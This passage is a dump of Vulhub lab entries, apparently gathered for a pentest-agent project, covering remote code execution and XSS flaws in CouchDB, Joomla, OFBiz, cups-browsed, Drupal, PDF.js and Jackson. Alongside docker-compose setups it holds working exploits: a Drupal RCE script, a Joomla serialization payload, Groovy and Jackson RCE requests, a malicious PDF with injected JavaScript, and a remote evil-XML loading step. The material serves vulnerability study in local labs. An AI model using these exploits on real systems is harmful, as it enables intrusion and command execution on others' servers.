input(\"> \")\n        if not CMD:\n            continue\n        elif CMD == \"exit\":\n            sys.exit(0)\n        s.send(compile_cmd(CMD))\n        data_size = struct.unpack(\">I\", s.recv(4))[0] # Get data size\n        s.recv(45)              # Control message\n        data_size -= 45         # Data size without control message\n        time.sleep(0.1)\n    elif data_size < 1024:        \n        data = s.recv(data_size)\n        #print(\"S---data_size: %d, data_recv_size: %d\" %(data_size,len(data)))\n        time.sleep(0.1)\n        print(data[3:].decode())\n        data_size = 0\n    else:        \n        data = s.recv(1024)\n        #print(\"L---data_size: %d, data_recv_size: %d\" %(data_size,len(data)))\n        time.sleep(0.1)\n        print(data[4:].decode())\n        data_size -= 1024\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2022-24706/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 212 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  couchdb:\n    image: vulhub/couchdb:3.2.1\n    ports:\n      - \"5984:5984\"\n      - \"4369:4369\"\n      - \"9100:9100\"\n    environment:\n      COUCHDB_USER: vulhub\n      COUCHDB_PASSWORD: vulhub\n\n```\n\n",
    "readme": "# CouchDB Erlang distribution Remote Command Execution (CVE-2022-24706)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang.\n\nApache CouchDB is written in Erlang and so it has built-in support for distributed computing (clustering). The cluster nodes communicate using the Erlang/OTP Distribution Protocol, which provides for the possibility of executing OS command requests as the user running the software.\n\nIn order to connect and run OS commands, one needs to know the secret phrase or in Erlang terms the \"cookie\". The CouchDB installer in versions 3.2.1 and below, by default, sets the cookie to \"monster\".\n\nReferences:\n\n- <https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html>\n- <https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/>\n- <https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb>\n- <https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit>\n\n## Vulnerability Environment\n\nExecute following command to start a Apache CouchDB 3.2.1:\n\n```\ndocker compose up -d\n```\n\nAfter service is started, 3 port will be listening on `target-ip`:\n\n- 5984: Web interface for Apache CouchDB\n- 4369: Erlang port mapper daemon (epmd)\n- 9100: clustered operation and runtime introspection port (command is actually executed through this port)\n\nIn practice, Web interface and epmd service port is fixed, clustered operation port is random. We can accesses the EPMD service to obtain the clustered operation port number.\n\n## Exploit\n\nWe can just use [this poc](poc.py) to exploit this vulnerability. The poc does 2 things, firstly obtain the clustered operation port from epmd service, then use default cookie to execute arbitrary commands in clusters.\n\n```\npython poc.py target-ip 4369\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2015-8562.md",
    "filenamenomd": "CVE-2015-8562",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/joomla/CVE-2015-8562/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/joomla/CVE-2015-8562/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 346 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/joomla:3.4.5\n   depends_on:\n    - mysql\n   environment: \n    - JOOMLA_DB_HOST=mysql\n    - JOOMLA_DB_PORT=3306\n    - JOOMLA_DB_USER=root\n    - JOOMLA_DB_PASSWORD=vulhub\n    - JOOMLA_DB_NAME=joomla\n   ports:\n    - \"8080:80\"\n mysql:\n   image: mysql:5.5\n   environment: \n    - MYSQL_ROOT_PASSWORD=vulhub\n\n```\n\n",
    "readme": "# Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJoomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.\n\nJoomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5. By storing user supplied headers in the databases session table it's possible to truncate the input by sending an 4-bytes UTF-8 character. The custom created payload is then executed once the session is read from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.\n\nReferences:\n\n- <https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html>\n- <https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html>\n\n## Vulnerable Environment\n\nExecuting following command to start a Joomla 3.4.5:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see the home page of it at `http://your-ip:8080`.\n\n## Exploit\n\nFirst of all, you need to send a request without User-Agent header and remember the Cookie in the response:\n\n![](2.png)\n\nThen use this script to generate a payload ([execute online](https://onlinephp.io/c/e824b)):\n\n```php\n<?php\nclass JSimplepieFactory {\n}\nclass JDatabaseDriverMysql {\n\n}\nclass SimplePie {\n    var $sanitize;\n    var $cache;\n    var $cache_name_function;\n    var $javascript;\n    var $feed_url;\n    function __construct()\n    {\n        $this->feed_url = \"phpinfo();JFactory::getConfig();exit;\";\n        $this->javascript = 9999;\n        $this->cache_name_function = \"assert\";\n        $this->sanitize = new JDatabaseDriverMysql();\n        $this->cache = true;\n    }\n}\n\nclass JDatabaseDriverMysqli {\n    protected $a;\n    protected $disconnectHandlers;\n    protected $connection;\n    function __construct()\n    {\n        $this->a = new JSimplepieFactory();\n        $x = new SimplePie();\n        $this->connection = 1;\n        $this->disconnectHandlers = [\n            [$x, \"init\"],\n        ];\n    }\n}\n\n$a = new JDatabaseDriverMysqli();\n$poc = serialize($a); \n\n$poc = str_replace(\"\\x00*\\x00\", '\\\\0\\\\0\\\\0', $poc);\n\necho \"123}__test|{$poc}\\xF0\\x9D\\x8C\\x86\";\n```\n\n![](1.png)\n\nPut this craft payload into User-Agent header with Cookie obtained earlier then send request again. As you can see, our code `phpinfo()` is executed:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2023-51467.md",
    "filenamenomd": "CVE-2023-51467",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2023-51467/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2023-51467/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ofbiz:18.12.10\n   ports:\n    - \"8443:8443\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache OFBiz Authentication Bypass Leads to RCE (CVE-2023-51467)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.\n\nThis vulnerability occurs as a result of incomplete fixing for [CVE-2023-49070](https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-49070). In Apache OFBiz version 18.12.10, the developers removed the XMLRPC to fix the previous RCE issue, but the authentication bypass still exists. The researcher from Chaitin Tech found another attack approach to perform the pre-auth RCE using Groovy expression injection.\n\nReferences:\n\n- <https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa>\n- <https://xz.aliyun.com/t/13211>\n- <https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/>\n\n## Vulnerable environment\n\nExecuting following command to start an Apache OfBiz 18.12.10 server:\n\n```\ndocker compose up -d\n```\n\nAfter a short wait, you can see the login page at `https://localhost:8443/accounting`.\n\n## Vulnerability Reproduce\n\nSend following request to execute command `id` by Groovy script:\n\n```\nPOST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1\nHost: localhost:8443\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 55\n\ngroovyProgram=throw+new+Exception('id'.execute().text);\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2024-47177.md",
    "filenamenomd": "CVE-2024-47177",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/cups-browsed/CVE-2024-47177/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cups-browsed/CVE-2024-47177/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 103 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n cups:\n   image: vulhub/cups-browsed:2.0.1\n   ports:\n    - \"631:631/tcp\"\n    - \"631:631/udp\"\n\n```\n\n",
    "readme": "# OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenPrinting CUPS (Common Unix Printing System) is an open-source printing system developed for Unix-like operating systems. It allows computers to act as print servers, managing local and network printers efficiently. Cups-Browsed is a daemon that is part of the CUPS system, specifically designed to browse for remote printers shared by other CUPS servers on the network. It facilitates automatic discovery and configuration of network printers, making it easier for users to access and use shared printing resources across a network without manual setup.\n\nIn the version 2.0.1 and before of Cups-Browsed, there is an issue from improper handling of the `FoomaticRIPCommandLine` parameter in PPD (PostScript Printer Description) files. An attacker can exploit this vulnerability by creating a malicious IPP (Internet Printing Protocol) server that sends crafted printer information to a vulnerable Cups-Browsed instance, then execute arbitrary command on the system that vulnerable Cups-Browsed is running.\n\nReference:\n\n- <https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/>\n- <https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8>\n\n## Vulnerable Environment\n\nExecute the following command to start a CUPS server 2.4.7 and vulnerable cups-browsed 2.0.1:\n\n```\ndocker-compose up -d\n```\n\nAfter the server is running, you can access the CUPS web interface via `http://<your-ip>:631`.\n\n## Exploit\n\nFirst, download the [evil-ipp-server](https://github.com/vulhub/evil-ipp-server) project and run the [poc.py](https://github.com/vulhub/evil-ipp-server/blob/master/poc.py):\n\n```\npython poc.py [evil-ipp-server-ip] [target-ip]\n```\n\nThis script will start a evil IPP server on the `[evil-ipp-server-ip]` and send a UDP packet to the vulnerable Cups-Browsed on the target machine which IP is `[target-ip]`.\n\nOnce the Cups-Browsed received the request, it will try to connect to the evil IPP server. The IPP server will send back some attributes including a crafted `printer-privacy-policy-uri` attribute. The payload structure likes following:\n\n```python\n(\n    SectionEnum.printer,\n    b'printer-privacy-policy-uri',\n    TagEnum.uri\n): [b'https://www.google.com/\"\\n*FoomaticRIPCommandLine: \"' +\n    b'echo 1 > /tmp/I_AM_VULNERABLE' +\n    b'\"\\n*cupsFilter2 : \"application/pdf application/vnd.cups-postscript 0 foomatic-rip'],\n```\n\nAfter that, Cups-Browsed will create a temporary PPD file in `/tmp/` and our payload will be injected in the file. The screenshot below shows the related logs from Cups-Browsed:\n\n![](1.png)\n\nAt this time, the command haven't been executed, because we need at least one print job to trigger the execution of the command.\n\nPrint jobs can come from regular users or attackers. If TCP port 631 is open, we can use a browser to access it and find the malicious IPP server we just added, then create a \"test page printing\" job:\n\n![](2.png)\n\nThen you can see, the `echo 1 > /tmp/I_AM_VULNERABLE` command has been executed successfully.\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2018-7602.md",
    "filenamenomd": "CVE-2018-7602",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2018-7602/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2018-7602/drupa7-CVE-2018-7602.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2018-7602/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 71 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/drupal:7.57\n   ports:\n    - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2018-7602/drupa7-CVE-2018-7602.py\n\n- Extension: .py\n- Language: python\n- Size: 4278 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\n\nimport requests\nimport argparse\nfrom bs4 import BeautifulSoup\n\ndef get_args():\n  parser = argparse.ArgumentParser( prog=\"drupa7-CVE-2018-7602.py\",\n                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),\n                    epilog= '''\n                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 <= 7.58\n                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form) \n                    with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax).\n                    ''')\n\n  parser.add_argument(\"user\", help=\"Username\")\n  parser.add_argument(\"password\", help=\"Password\")\n  parser.add_argument(\"target\", help=\"URL of target Drupal site (ex: http://target.com/)\")\n  parser.add_argument(\"-c\", \"--command\", default=\"id\", help=\"Command to execute (default = id)\")\n  parser.add_argument(\"-f\", \"--function\", default=\"passthru\", help=\"Function to use as attack vector (default = passthru)\")\n  parser.add_argument(\"-x\", \"--proxy\", default=\"\", help=\"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)\")\n  args = parser.parse_args()\n  return args\n\ndef pwn_target(target, username, password, function, command, proxy):\n  requests.packages.urllib3.disable_warnings()\n  session = requests.Session()\n  proxyConf = {'http': proxy, 'https': proxy}\n  try:\n    print('[*] Creating a session using the provided credential...')\n    get_params = {'q':'user/login'}\n    post_params = {'form_id':'user_login', 'name': username, 'pass' : password, 'op':'Log in'}\n    print('[*] Finding User ID...')\n    session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)\n    get_params = {'q':'user'}\n    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)\n    soup = BeautifulSoup(r.text, \"html.parser\")\n    user_id = soup.find('meta', {'property': 'foaf:name'}).get('about')\n    if (\"?q=\" in user_id):\n      user_id = user_id.split(\"=\")[1]\n    if(user_id):\n      print('[*] User ID found: ' + user_id)\n    print('[*] Poisoning a form using \\'destination\\' and including it in cache.')\n    get_params = {'q': user_id + '/cancel'}\n    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)\n    soup = BeautifulSoup(r.text, \"html.parser\")\n    form = soup.find('form', {'id': 'user-cancel-confirm-form'})\n    form_token = form.find('input', {'name': 'form_token'}).get('value')\n    get_params = {'q': user_id + '/cancel', 'destination' : user_id +'/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command }\n    post_params = {'form_id':'user_cancel_confirm_form','form_token': form_token, '_triggering_element_name':'form_id', 'op':'Cancel account'}\n    r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)\n    soup = BeautifulSoup(r.text, \"html.parser\")\n    form = soup.find('form', {'id': 'user-cancel-confirm-form'})\n    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')\n    if form_build_id:\n        print('[*] Poisoned form ID: ' + form_build_id)\n        print('[*] Triggering exploit to execute: ' + command)\n        get_params = {'q':'file/ajax/actions/cancel/#options/path/' + form_build_id}\n        post_params = {'form_build_id':form_build_id}\n        r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)\n        parsed_result = r.text.split('[{\"command\":\"settings\"')[0]\n        print(parsed_result)\n  except:\n    print(\"ERROR: Something went wrong.\")\n    raise\n\ndef main():\n  print ()\n  print ('===================================================================================')\n  print ('|   DRUPAL 7 <= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |')\n  print ('|                                   by pimps                                      |')\n  print ('===================================================================================\\n')\n\n  args = get_args() # get the cl args\n  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())\n\n\nif __name__ == '__main__':\n  main()\n\n```\n\n",
    "readme": "# Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDrupal is a free and open-source web content management framework written in PHP.\n\nA remote code execution vulnerability exists in Drupal 7.x and 8.x. The vulnerability is caused by insufficient input sanitization, where double URL encoding of the '#' character can bypass the sanitize() function filter, leading to remote code execution.\n\nReferences:\n\n- <https://www.drupal.org/sa-core-2018-004>\n- <https://github.com/pimps/CVE-2018-7600>\n- <https://github.com/kastellanos/CVE-2018-7602>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Drupal 7.57 server:\n\n```bash\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080/` to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.\n\nRemember the username and password of the account you created during the installation, because you will need it to exploit the vulnerability.\n\n## Vulnerability Reproduction\n\nUsing the PoC from [pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py), execute the following command to exploit the vulnerability:\n\n```bash\n# Replace \"id\" with the command you want to execute\n# First \"drupal\" is your username, second \"drupal\" is your password\npython3 drupa7-CVE-2018-7602.py -c \"id\" drupal drupal http://127.0.0.1:8080/\n```\n\nAs shown in the red box in the image below, the command is successfully executed:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2024-4367.md",
    "filenamenomd": "CVE-2024-4367",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/pdfjs/CVE-2024-4367/poc.pdf\n- /home/yay/pentest-agent/vulhub/sites_no_md/pdfjs/CVE-2024-4367/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/pdfjs/CVE-2024-4367/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/pdfjs/CVE-2024-4367/poc.pdf\n\n- Extension: .pdf\n- Language: unknown\n- Size: 1970 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n%PDF-1.4\n%\n8 0 obj\n<<\n/PatternType 2\n/Shading<<\n  /Function<<\n    /Domain[0 1]\n    /C0[0 0 1]\n    /C1[1 0.6 0]\n    /N 1\n    /FunctionType 2\n  >>\n  /ShadingType 2\n  /Coords[46 400 537 400]\n  /Extend[false false]\n  /ColorSpace/DeviceRGB\n>>\n/Type/Pattern\n>>\nendobj\n5 0 obj\n<<\n/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]\n/Type/Font\n/BaseFont/PAXEKO+SourceSansPro-Bold\n/LastChar 102\n/Encoding/WinAnsiEncoding\n/FontMatrix [0.1 0 0 0.1 0 (1\\); \\nalert\\('document.domain: '+window.document.domain+'\\\\nlocation: '+window.location+'\\\\ncookie: '+window.document.cookie)]\n/Subtype/Type1\n/FirstChar 65\n/FontDescriptor 9 0 R\n>>\nendobj\n2 0 obj\n<<\n/Kids[3 0 R]\n/Type/Pages\n/Count 1\n>>\nendobj\n9 0 obj\n<<\n/Type/FontDescriptor\n/ItalicAngle 0\n/Ascent 751\n/FontBBox[-6 -12 579 713]\n/FontName/PAXEKO+SourceSansPro-Bold\n/StemV 100\n/CapHeight 713\n/Flags 32\n/FontFile3 10 0 R\n/Descent -173\n/MissingWidth 250\n>>\nendobj\n6 0 obj\n<<\n/Length 128\n>>\nstream\n47 379 489 230 re S\n/Pattern cs\nBT\n  50 500 Td\n  117 TL\n  /F1 150 Tf\n  /P1 scn\n  (AbCdEf) Tj\n  /P2 scn\n  (AbCdEf) '\nET\nendstream\nendobj\n3 0 obj\n<<\n/Type/Page\n/Resources 4 0 R\n/Contents 6 0 R\n/Parent 2 0 R\n/MediaBox[0 0 595.2756 841.8898]\n>>\nendobj\n10 0 obj\n<<\n/Length 800\n/Subtype/Type2\n>>\nstream\n\nendstream\nendobj\n7 0 obj\n<<\n/PatternType 1\n/Matrix[1 0 0 1 50 0]\n/Length 58\n/TilingType 1\n/BBox[0 0 16 16]\n/YStep 16\n/PaintType 1\n/Resources<<\n>>\n/XStep 16\n>>\nstream\n0.65 g\n0 0 16 16 re f\n0.15 g\n0 0 8 8 re f\n8 8 8 8 re f\nendstream\nendobj\n4 0 obj\n<<\n/Pattern<<\n  /P1 7 0 R\n  /P2 8 0 R\n>>\n/Font<<\n  /F1 5 0 R\n>>\n>>\nendobj\n1 0 obj\n<<\n/Pages 2 0 R\n/Type/Catalog\n/OpenAction[3 0 R /Fit]\n>>\nendobj\n\nxref\n0 11\n0000000000 65535 f \n0000002260 00000 n \n0000000522 00000 n \n0000000973 00000 n \n0000002178 00000 n \n0000000266 00000 n \n0000000794 00000 n \n0000001953 00000 n \n0000000015 00000 n \n0000000577 00000 n \n0000001085 00000 n \ntrailer\n<<\n/ID[(w4f) (w4f)]\n/Root 1 0 R\n/Size 11\n>>\nstartxref\n2333\n%%EOF\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/pdfjs/CVE-2024-4367/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 140 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/pdfjs:4.1.392\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/pdfjs/CVE-2024-4367/index.php\n\n- Extension: .php\n- Language: php\n- Size: 828 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nif (!empty($_FILES)):\n\n// Check for errors\nif($_FILES['file_upload']['error'] > 0){\n    die('An error ocurred when uploading.');\n}\n\n// Check filesize\nif(!is_uploaded_file($_FILES['file_upload']['tmp_name'])) {\n    die('File is not uploaded file');\n}\n\n$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\nif ($ext !== 'pdf') {\n    die('Unsupported filetype uploaded.');\n}\n\n$new_name = uniqid() . '.pdf';\nif(!move_uploaded_file($_FILES['file_upload']['tmp_name'], __DIR__ . '/upload/' . $new_name)){\n    die('Error uploading file - check destination is writeable.');\n}\n\nheader('Location: /web/viewer.html?file=../upload/' . $new_name, true, 302);\nexit;\nelse:\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<?php\nendif;\n```\n\n",
    "readme": "# PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPDF.js is a Portable Document Format (PDF) viewer that is built with HTML5.\n\nIn the PDF.js version prior to 4.1.392, a JavaScript code injection was found. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened.\n\nReferences:\n\n- <https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/>\n\n## Vulnerable environment\n\nExecute following command to start a server that contains PDF.js 4.1.392:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse `http://your-ip:8080` you will see an uploading page.\n\n## Vulnerability reproduce\n\nUpload malicious PDF file [poc.pdf](poc.pdf) to trigger the XSS:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-7525.md",
    "filenamenomd": "CVE-2017-7525",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jackson/CVE-2017-7525/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jackson/CVE-2017-7525/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 99 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/spring-with-jackson:2.8.8\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Jackson-databind Deserialization Remote Command Execution (CVE-2017-7525)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJackson Databind is a popular Java library used for serializing Java objects to JSON (JavaScript Object Notation) and deserializing JSON back into Java objects.\n\nJackson-databind supports [Polymorphic Deserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization) feature (which is disabled by default). Attackers are able to use this feature to perform remote code exection.\n\nReferences:\n\n- [JacksonPolymorphicDeserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)\n- [Exploiting the Jackson RCE: CVE-2017-7525](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)\n- [jackson-rce-via-spel](https://github.com/irsl/jackson-rce-via-spel)\n- [Jackson Deserializer security vulnerability](https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1)\n\n## Vulnerable environment\n\nExecute following command to start a web server that uses Jackson 2.8.8:\n\n```shell\ndocker compose up -d\n```\n\nAfter the server is started, `http://your-ip:8080/` is your web page.\n\n## Exploit\n\n### CVE-2017-7525\n\nSend following request to use the `TemplatesImpl` to execute Java bytescode, which contains command `touch /tmp/prove1.txt`:\n\n```\nPOST /exploit HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 1298\n\n{\n  \"param\": [\n    \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n    {\n      \"transletBytecodes\": [\n  \"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==\"\n      ],\n      \"transletName\": \"a.b\",\n      \"outputProperties\": {}\n    }\n  ]\n}\n```\n\n![](1.png)\n\nThis exploit can only be used in environments with Java versions lower than 7u21.\n\n### CVE-2017-17485\n\nJackson released a [patch](https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1) to fix CVE-2017-7525, but CVE-2017-17485 used `org.springframework.context.support.FileSystemXmlApplicationContext` to bypass it.\n\nTo reproduce CVE-2017-17485, prepare a evil XML content on your server, such as `http://evil/spel.xml`:\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"\n     http://www.springframework.org/schema/beans\n     http://www.springframework.org/schema/beans/spring-beans.xsd\n\">\n    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\">\n        <constructor-arg>\n            <array>\n                <value>touch</value>\n                <value>/tmp/prove2.txt</value>\n            </array>\n        </constructor-arg>\n        <property name=\"any\" value=\"#{ pb.start() }\"/>\n    </bean>\n</beans>\n```\n\nThen, send following request to load the evil XML and execute command `touch /tmp/prove2.txt`:\n\n```\nPOST /exploit HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 